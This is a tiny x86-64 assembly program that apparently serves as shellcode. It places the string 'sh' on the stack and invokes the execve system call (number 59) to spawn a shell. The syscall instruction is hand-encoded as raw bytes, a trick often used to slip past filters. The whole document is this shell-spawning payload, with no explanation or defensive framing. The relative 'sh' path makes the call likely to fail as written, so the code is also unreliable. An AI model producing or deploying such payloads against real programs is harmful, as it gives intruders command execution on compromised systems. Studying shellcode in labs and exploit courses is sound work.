section .text
global _start

_start:
    push 0x006873
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx 
    xor rax, rax    
    mov rax, 59
    db 0x0f, 0x05                
    ret